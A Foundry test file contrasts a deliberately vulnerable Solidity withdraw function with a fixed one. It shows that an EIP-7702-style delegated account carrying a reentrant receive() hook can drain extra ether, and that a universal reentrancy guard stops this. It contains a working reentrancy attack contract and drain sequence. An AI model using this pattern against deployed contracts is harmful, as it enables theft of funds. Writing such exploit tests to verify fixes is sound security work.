// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/PA04_PA05_Vulnerable.sol";
import "../src/fixed/PA04_PA05_Fixed.sol";

contract PA04_EOAReentrancyTest is Test {
    PA04_EOAReentrancy       public vulnProtocol;
    PA04_SafeReentrancyGuard public safeProtocol;

    address payable public delegatedEOA;
    address payable public attacker;

    function setUp() public {
        attacker     = payable(makeAddr("attacker"));
        delegatedEOA = payable(makeAddr("delegatedEOA"));
        vm.deal(delegatedEOA, 10 ether);

        vulnProtocol = new PA04_EOAReentrancy();
        safeProtocol = new PA04_SafeReentrancyGuard();
    }

    /**
     * @notice RED: Delegated EOA with receive() hook reenters vulnerable withdraw()
     *
     * The vulnerable contract skips the reentrancy guard for callers with
     * no code (extcodesize == 0). A delegated EOA has code, but the guard
     * check happens AFTER the balance read — so if the delegation happened
     * after deposit, the EOA can reenter.
     *
     * More precisely: the bug is that the balance is zeroed AFTER the call,
     * combined with the EOA carve-out.
     */
    function test_RED_DelegatedEOAReentersVulnWithdraw() public {
        console.log("=== PA-04 EOA-ONLY REENTRANCY EXPLOIT ===");

        // Deposit from delegatedEOA (before delegation - clean EOA)
        vm.prank(delegatedEOA);
        vulnProtocol.deposit{value: 2 ether}();
        assertEq(vulnProtocol.balances(delegatedEOA), 2 ether, "Deposited 2 ETH");

        // Now etch a reentrant receiver onto the EOA (simulates 7702 delegation)
        ReentrantReceiver receiver = new ReentrantReceiver(address(vulnProtocol), delegatedEOA);
        vm.etch(delegatedEOA, address(receiver).code);

        // Store the target in the EOA's storage slot 0 (matching ReentrantReceiver layout)
        vm.store(delegatedEOA, bytes32(uint256(0)), bytes32(uint256(uint160(address(vulnProtocol)))));
        vm.store(delegatedEOA, bytes32(uint256(1)), bytes32(uint256(uint160(address(delegatedEOA)))));

        vm.deal(address(vulnProtocol), 5 ether);
        uint256 protocolBefore = address(vulnProtocol).balance;
        console.log("Protocol balance before:", protocolBefore / 1e18, "ETH");

        // The delegated EOA calls withdraw - its receive() hook reenters
        vm.prank(delegatedEOA);
        vulnProtocol.withdraw();

        console.log("Protocol balance after:", address(vulnProtocol).balance / 1e18, "ETH");
        console.log("Delegated EOA balance:", delegatedEOA.balance / 1e18, "ETH");

        // Reentrancy succeeded: more than 2 ETH was withdrawn
        assertGt(delegatedEOA.balance, 2 ether, "Reentrancy drained more than deposited");
        console.log("REENTRANT DRAIN: extracted more than deposited balance");
    }

    /**
     * @notice GREEN: Universal nonReentrant blocks delegated EOA reentrancy
     */
    function test_GREEN_UniversalGuardBlocksEOAReentrancy() public {
        console.log("=== PA-04 FIXED: Universal nonReentrant ===");

        vm.prank(delegatedEOA);
        safeProtocol.deposit{value: 2 ether}();

        // Etch reentrant receiver onto EOA
        ReentrantReceiver receiver = new ReentrantReceiver(address(safeProtocol), delegatedEOA);
        vm.etch(delegatedEOA, address(receiver).code);
        vm.store(delegatedEOA, bytes32(uint256(0)), bytes32(uint256(uint160(address(safeProtocol)))));
        vm.store(delegatedEOA, bytes32(uint256(1)), bytes32(uint256(uint160(address(delegatedEOA)))));

        vm.deal(address(safeProtocol), 5 ether);

        // Reentrancy attempt - inner call is blocked by nonReentrant
        vm.prank(delegatedEOA);
        safeProtocol.withdraw(); 

        console.log("Reentrancy blocked by universal guard");
        assertEq(safeProtocol.balances(delegatedEOA), 0, "Balance zeroed properly");
        assertEq(delegatedEOA.balance, 10 ether, "Attacker only recovered deposit - protocol safe");
    }
}

// A delegate whose receive() tries to call withdraw() again
contract ReentrantReceiver {
    address public target;
    address public me;
    uint256 public depth;

    constructor(address _target, address _me) {
        target = _target;
        me     = _me;
    }

    receive() external payable {
        if (depth == 0) {
            depth++;
            // Reenter the withdraw function
            (bool ok,) = target.call(abi.encodeWithSignature("withdraw()"));
            ok; // ignore result in receive
        }
    }
}
